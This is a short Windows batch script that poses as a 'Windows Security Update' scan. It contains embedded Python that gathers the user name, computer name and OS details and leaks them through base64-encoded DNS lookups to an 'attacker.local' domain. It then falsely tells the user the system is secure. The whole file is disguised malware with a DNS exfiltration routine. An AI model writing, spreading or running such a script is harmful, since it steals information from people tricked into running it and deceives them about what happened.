@echo off
title Windows Security Update
echo Running security scan...

python -c "
import socket, platform, getpass, base64, time

def send_dns(data, chunk_id):
    try:
        enc = base64.b64encode(data.encode()).decode().replace('=', '')[:60]
        dns = f'{chunk_id}.{enc}.attacker.local'
        socket.gethostbyname_ex(dns)
    except:
        pass

user = getpass.getuser()
comp = platform.node()
os_info = platform.platform()
data = f'User:{user}|Computer:{comp}|OS:{os_info}'

for i, chunk in enumerate([data[j:j+50] for j in range(0, len(data), 50)]):
    send_dns(chunk, f'chunk{i}')
    time.sleep(0.5)
"

echo Security scan completed successfully.
echo Your system is secure.
pause
